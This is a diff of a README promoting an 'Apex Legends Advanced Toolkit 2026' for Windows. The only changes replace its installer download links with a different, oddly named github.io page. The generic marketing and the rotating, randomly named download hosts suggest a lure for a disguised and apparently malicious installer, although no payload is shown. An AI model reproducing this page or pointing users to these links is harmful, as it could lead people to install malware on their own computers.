@@ -2,7 +2,7 @@
 
 Apex Legends Advanced Toolkit 2026 is a comprehensive desktop application designed to enhance and streamline your Apex Legends experience on Windows 10 and Windows 11. Built with performance-driven players in mind, this toolkit provides a clean interface for managing configurations, optimizing system resources, and monitoring in-game statistics. Whether you are a seasoned competitor or a casual player, the toolkit adapts to your needs with modular features and an intuitive dashboard.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
@@ -78,7 +78,7 @@ The overlay and monitoring features can run alongside Apex Legends without signi
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
